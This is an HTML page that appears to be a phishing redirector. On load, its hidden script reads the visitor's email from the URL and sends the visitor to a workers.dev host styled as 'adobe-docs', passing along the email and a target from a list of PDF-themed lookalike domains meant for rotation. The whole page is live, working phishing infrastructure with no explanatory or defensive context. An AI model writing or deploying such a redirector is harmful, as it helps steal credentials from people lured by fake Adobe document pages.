<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    // List of target sites
    const sites = [
      "https://pdfadobe-scan-3030-fastdoc.workers.dev",
      "https://pdfhub-2025-clouddocument.workers.dev",
      "https://pdfgen-88-smartconvert.workers.dev",
      "https://pdfbox-909-digitalvault.workers.dev",
      "https://pdfdocs-77-archivecloud.workers.dev",
      "https://pdfsafe-101-securevault.workers.dev",
      "https://pdfflow-2025-digitalcopy.workers.dev",
      "https://pdfcore-500-cloudreader.workers.dev",
      "https://pdfdocs-77-archivecloud.workers.dev"
    ];

    let current = 0;

    // Function to get ?email= from query string
    function getEmail() {
      const params = new URLSearchParams(window.location.search);
      return params.get("email") || "";
    }

    function redirectLoop() {
      const target = sites[current]; // pick current site
      const email = getEmail();

      // Build Worker URL with target + email
      let url = "https://pdfscan-3030-fastdoc.adobe-docs.workers.dev/?target=" + encodeURIComponent(target);
      if (email) {
        url += "&email=" + encodeURIComponent(email);
      }

      // Redirect immediately
      window.location.replace(url);

      // Move to next site for next visit (round-robin)
      current = (current + 1) % sites.length;
    }

    // Trigger redirect when page loads
    window.addEventListener("load", redirectLoop);
  </script>
</head>
<body style="display:none;">
  Redirecting...
</body>
</html>
